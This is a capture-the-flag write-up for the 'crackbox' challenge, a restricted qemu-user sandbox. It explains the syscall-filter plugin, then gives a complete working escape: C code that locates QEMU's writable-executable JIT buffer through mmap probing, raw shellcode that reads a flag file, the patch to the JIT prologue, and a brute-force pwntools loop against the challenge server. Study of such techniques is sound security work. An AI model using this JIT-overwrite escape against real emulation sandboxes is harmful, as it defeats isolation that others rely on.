0 solves / 505 points
	Author: unvariant
	Just another restricted qemu-user sandbox.
___
***NOTE***: I didn't solve this challenge during the ctf. but I believe that writing a writeup and having hand-on experience is good in order to have a better understanding of the challenge and to learn the most from it!

I started writing this writeup when I tried solving the challenge, ended it after the ctf ended.
___

The first thing i did was i tried to run the script.
# Blackbox testing

Let's take a look at what it does
```
$ nc chal.amt.rs 1339
program: aaaaaaaaaaa


```

It seems like the program gets an input and stops responding.
Let's try to give it a really big buffer using a python script:

```python
from pwn import *

con = remote("chal.amt.rs", 1339)

con.send(b"A" * 10000000)

con.interactive()
```

and it crashes.
# Running the program locally

I build the docker using 
`sudo docker build --tag crackbox .`
and ran it using
`sudo docker run --rm --privileged -p 0.0.0.0:5000:5000 -it crackbox`

now i can connect using `nc 127.0.0.1 5000`!

# Anylizing the code

## Analyzing `libfilter.so`

Looking at the `run.sh` file provided with the challenge we can see that qemu is called using the command line
`./qemu -plugin ./libfilter.so ./chal`

### So what is a qemu plugin?
Qemu works by translating our code in run time from the guest instruction set to the host instruction set.

In user-mode emulation (like in the challenge) Qemu does that by using a JIT (just in time) compiler that does just that (called TCG) **REMEMBER THIS, IT WILL BE IMPORTANT LATER!.

A plugin is a piece of code that runs when that translation happens.

*An important thing to note is that this plugin runs before the translated code is executed, believe me, I tried :(
### How does a plugin operate
```c
 * The general life-cycle of a plugin is:
 *
 *  - plugin is loaded, public qemu_plugin_install called
 *    - the install func registers callbacks for events
 *    - usually an atexit_cb is registered to dump info at the end
 *  - when a registered event occurs the plugin is called
 *     - some events pass additional info
 *     - during translation the plugin can decide to instrument any
 *       instruction
 *  - when QEMU exits all the registered atexit callbacks are called
 *
```
from the qemu source code.

### Let's take a look at `libfilter.so`
lets take a look at the `qemu_plugin_install`.
```c
__int64 __fastcall qemu_plugin_install(__int64 a1)
{
  qemu_plugin_register_vcpu_syscall_cb(a1, (__int64)vcpu_syscall);
  return 0LL;
}
```

As we can see, `qemu_plugin_install` calls the `qemu_plugin_register_vcpu_syscall_cb`.
That function adds a new call back  plugin to the vcpu syscall.

The function that will be called is `vcpu_syscall`.
```c
int __fastcall vcpu_syscall(__int64 a1, __int64 a2, __int64 syscall_number)
{
  int result; // eax

  if ( activated[0]
    && syscall_number
    && syscall_number != 1
    && syscall_number != 9
    && syscall_number != 60
    && syscall_number != 231 )
  {
    printf("[-] INVALID SYSCALL: %ld\n", syscall_number);
    fflush(stdout);
    exit(1);
  }
  result = activated[0] ^ 1;
  if ( activated[0] != 1 && syscall_number == 0x6969 )
  {
    activated[0] = 1;
    return puts("[+] FILTER ACTIVATED");
  }
  return result;
}
```

As we can see, that plugin operates as a tollegable filter, that can be turned on by calling syscall number 0x6969.

After the filter is turned on the only avilable syscalls are
```
0 - sys_read
1 - sys_write
9 - sys_mmap 
60 - sys_exit
231 - sys_exit_group
```

## Analyzing `chal`
I opened the code using IDA.
Let's look at the main function

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  void *ptr; // [rsp+8h] [rbp-8h]

  setbuf(_bss_start, 0LL);
  ptr = mmap(0LL, 0x10000uLL, 7, 34, -1, 0LL);
  printf("program: ");
  fread(ptr, 1uLL, 0x10000uLL, stdin);
  dup2(1, 13);
  close(0);
  close(2);
  filter();
  ((void (*)(void))ptr)();
  return 0;
}
```

As we can see, we first map a pointer using mmap.

### Calling mmap
___
*a cool trick i like using for understanding the flags is just running the program with strace:
```
$ strace ./chal
...

mmap(NULL, 65536, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7c1c3cf83000
...
```
___

So we create a new mapping of size 0x10000 to a kernel-chosen address.
We can write, read and exec in that memory location.

### Calling fread
We read all of our data from stdin (exactly 0x10000 bytes) into that buffer

### Doing shit with fd-s
Also, for some reason with close the `STDIN_FILENO` (0) and the `STDERR_FILENO` (2). we copy the `STDOUT_FILENO` to fd number 13.

That seems unimportant to me, but maybe we will return to that later.

### Filter function
After all of that we call the filter function, it seems like IDA struggles to decompile it so let's look at the assembly code:

```nasm
public filter
filter proc near

push    rbp
mov     rbp, rsp
mov     eax, 6969h
syscall
nop
pop rbp
retn

filter endp
```

So this just turns the filter in `libfilter.so` on.
### calling `ptr`
after doing all of that we just execute our input as code.

## Exploiting this

Our limitations in this challenge are such:
We can only use these syscalls 
```
0 - sys_read
1 - sys_write
9 - sys_mmap 
60 - sys_exit
231 - sys_exit_group
```

### A few things we need to know before the exploit
1. Qemu-user runs both the host and the guest in the same address-spaces, that's because it's not used as a sandbox in that mode.
2. The JIT is operating using a gigantic area in memory, with `rwx` permisisons, called `code_gen_buffer`. That code is used to translate every instruction.
3. While qemu does sanitize memory accesses for some syscalls (such as `sys_open`, `sys_openat`, `creat`, `link`, `linkat`, `unlinkat`, `execveat`, `chdir`, `mknod` and more... ) it doesn't check memory locations for mmap, also, they don't check direct memory accesses!

Now that we know all of this, let's write the exploit
## Exploit strategy
1. finding the location of JIT.
2. overwriting it to run our shellcode

So how can we find the location of JIT?
We can find mapped areas in memory using `mmap` and the flag `MAP_FIXED_NOREPLACE`.
We will just iterate over all of the areas in memory until we land on one that fails with the error `EEXIST`.

### Finding the general location of the JIT mapped area
To do I ran the docker and connected locally using `nc 127.0.0.1 5000`.
I created a lot of connections to get a general feel of where it is usually mapped.

after doing so I ran `sudo docker exec -it <container_id> /bin/sh`
and inside `sh` i ran

```
/ # grep -r rwx /proc/*/maps
/proc/20095/maps:71fd2d205000-71fd35204000 rwxp 00000000 00:00 0
/proc/20100/maps:768ac0000000-768ac7fff000 rwxp 00000000 00:00 0
/proc/20103/maps:7eebc4d70000-7eebccd6f000 rwxp 00000000 00:00 0
...
```
I saw that it could end with 0xf7a000, and that it appears a lot
```
/ # grep -r "f7a.*rwx" /proc/*/maps
/proc/20635/maps:7fbfbbf7a000-7fbfc3f79000 rwxp 00000000 00:00 0
/proc/21148/maps:70e5d7f7a000-70e5dff79000 rwxp 00000000 00:00 0
/proc/21683/maps:785006f7a000-78500ef79000 rwxp 00000000 00:00 0
/proc/22005/maps:7a5083f7a000-7a508bf79000 rwxp 00000000 00:00 0
/proc/22010/maps:70c427f7a000-70c42ff79000 rwxp 00000000 00:00 0
```
so we could guess that it ends with it and filter on it!
___
*NOTE*: for some reason that didn't work, I just ended up using the first mapped area I found and brute forcing that way :) it did show me that it started in 0x700000000000 though! (the author used 0x4d5000 which does work)
___
### Finding out what is in the JIT mapped area
I ran the docker using ``
```
sudo docker run --rm --privilaged -p 0.0.0.0:5000:5000 -it crackbox /bin/sh
```

And in it I changed the `/srv/app/run` file to be
```
#!/bin/sh

/app/qemu -plugin /app/libfilter.so /app/chall -d out_asm
```

After doing that i executed `chroot /srv/ /app/run 2> out`

looking at the `out` file i saw an interesting thing
```
PROLOGUE: [size=45]
0x7b6e10000000:  55                       pushq    %rbp
0x7b6e10000001:  53                       pushq    %rbx
0x7b6e10000002:  41 54                    pushq    %r12
0x7b6e10000004:  41 55                    pushq    %r13
0x7b6e10000006:  41 56                    pushq    %r14
0x7b6e10000008:  41 57                    pushq    %r15
0x7b6e1000000a:  48 8b ef                 movq     %rdi, %rbp
0x7b6e1000000d:  48 81 c4 78 fb ff ff     addq     $-0x488, %rsp
0x7b6e10000014:  ff e6                    jmpq     *%rsi
0x7b6e10000016:  33 c0                    xorl     %eax, %eax
0x7b6e10000018:  48 81 c4 88 04 00 00     addq     $0x488, %rsp
0x7b6e1000001f:  c5 f8 77                 vzeroupper
0x7b6e10000022:  41 5f                    popq     %r15
0x7b6e10000024:  41 5e                    popq     %r14
0x7b6e10000026:  41 5d                    popq     %r13
0x7b6e10000028:  41 5c                    popq     %r12
0x7b6e1000002a:  5b                       popq     %rbx
0x7b6e1000002b:  5d                       popq     %rbp
0x7b6e1000002c:  c3                       retq

OUT: [size=96]
  -- guest addr 0x00002aaaab2cb540 + tb prologue
0x7b6e10000100:  8b 5d f0                 m
```

It seems like there is enough space to fit my shellcode between 0x2d and 0x100 in the mapped location.

So we can write our shellcode there and jump to it!

Let's write our code!
 ```c
#include <sys/mman.h>
#include <stdint.h>

#define NULL            ((void *)0)
#define EEXIST          (17)

#define SYS_read        (0)
#define SYS_write       (1)
#define SYS_mmap        (9)
#define SYS_exit        (60)
#define SYS_exit_group  (231)

#define JIT_SEARCH_START (0x0000700000000000)
#define JIT_SEARCH_END   (0x0000800000000000)

#define BROAD_SEARCH_LENGTH  (1 << 24)
#define MID_SEARCH_LENGTH    (1 << 10)
#define NARROW_SEARCH_LENGTH (1 << 3)


void *memcpy(void *dst, const void *src, size_t n)
{
    int i;
    char *src_char = (char *)src;
    char *dst_char = (char *)dst;
    for (i = 0; i < n; i++)
    {
        dst_char[i] = src_char[i];
    }
    return dst;
}


void *syscall(int syscall_number,
              void *arg1,
              void *arg2,
              void *arg3,
              void *arg4,
              void *arg5,
              void *arg6);
asm(
".global syscall\n"
"syscall:\n"
"movq rax, rdi\n"
"movq rdi, rsi\n"
"movq rsi, rdx\n"
"movq rdx, rcx\n"
"movq r10, r8\n"
"movq r8, r9\n"
"movq r9, [rsp + 32]\n"
"syscall\n"
"ret");


void *search_memory(void *start, void *end, uint64_t length)
{
    int i = 0;
    void *ret;
    while (start < end)
    {
        ret = syscall(SYS_mmap,
                      start,
                      length,
                      PROT_READ | PROT_WRITE,
                      MAP_ANONYMOUS | MAP_PRIVATE | MAP_FIXED_NOREPLACE,
                      -1,
                      0);
        if (-EEXIST == ret)
        {
            return start;
        }

        start = start + length;
    }
    return NULL;

}

void *search_for_jit()
{
    void *result = JIT_SEARCH_START;

    result = search_memory(result, JIT_SEARCH_END, BROAD_SEARCH_LENGTH);
    if (NULL == result)
        // no mapped area found
        return NULL;

    // narrowing down the search
    result = search_memory(result, JIT_SEARCH_END, MID_SEARCH_LENGTH);
    result = search_memory(result, JIT_SEARCH_END, NARROW_SEARCH_LENGTH);

    return result;
}

__attribute__((section(".entry"))) int main()
{
    void *jit_location;

    char *shellcode = "\x48\x31\xF6\x56\x48\xBB\x67\x2E\x74\x78\x74\x00\x00\x00\x53\x48\xBB\x2F\x61\x70\x70\x2F\x66\x6C\x61\x53\x54\x5F\x48\xC7\xC6\x00\x00\x00\x00\x48\x31\xD2\x48\xC7\xC0\x02\x00\x00\x00\x0F\x05\x48\x89\xC7\x54\x5E\x48\xC7\xC2\x64\x00\x00\x00\x48\xC7\xC0\x00\x00\x00\x00\x0F\x05\x54\x5E\x48\xC7\xC7\x0D\x00\x00\x00\x48\xC7\xC2\x64\x00\x00\x00\x48\xC7\xC0\x01\x00\x00\x00\x0F\x05";

    int shellcode_length = 93;

    jit_location = search_for_jit();

    if (NULL == jit_location)
    {
        // no mapped location found
        return -1;
    }

    (void)memcpy((char *)jit_location + 0x2d, shellcode, shellcode_length);

    asm volatile("mov rax, %[jit_location]\n"
                 "mov word ptr [rax + 0x14], 0x17eb\n" // jmp 0x17
                 :
                 : [jit_location] "r"(jit_location)
                 : "memory", "rax");
}
```

and we get the flag!
```
amateursCTF{mmap_sidechannel_easy_peasy}
```

___

shellcode used:
```
; pushing '/app/flag.txt' on the stack
xor    rsi,rsi
push   rsi
mov rbx, 0x7478742e67
push rbx
mov rbx, 0x616c662f7070612f
push rbx

; calling open('/app/flag.txt', O_RDONLY, NULL);
push   rsp
pop    rdi
mov rsi, 0
xor rdx, rdx
mov    rax,2
syscall

; now rax holds the fd of '/app/flag.txt'
; calling read(fd_of_flag, stack, 100);
mov rdi, rax
push rsp
pop rsi
mov rdx, 100
mov rax, 0
syscall

; calling write(13, stack, 100);
push rsp
pop rsi
mov rdi, 13
mov rdx, 100
mov rax, 1
syscall
```
I used this shellcode because at the start of the challenge the program closed `STDIN` fd. 


`exploit.py`
```
from pwn import *

data = open("script", "rb").read().ljust(0x10000, b"\x00")

while True:
    con = remote("chal.amt.rs", 1339)
    con.sendafter(b": ", data)

    try:
        print(con.read(1))
        con.interactive()
    except:
        con.close()
```


`makefile`
``` title="makefile"
.PHONY: script run

script: script.c
	gcc \
	-o script -O0 \
	-masm=intel -march=native \
	-nostdlib -nostartfiles \
	-fno-builtin -fno-stack-protector \
	-ffreestanding -pie -fPIE \
	-Wl,--oformat=binary \
	-T linker.ld script.c

run: script exploit.py
	python3 exploit.py
```


`linker.ld`
```
ENTRY(main)

SECTIONS {
    /* here we place `.entry` as the first section */
    .entry  : { *(.entry) }
    . = .;
    .text   : { *(.text.*) }
    .rodata : { *(.rodata.*) }
    .data   : { *(.data.*) }
    .bss    : { *(.bss.*) }
}
```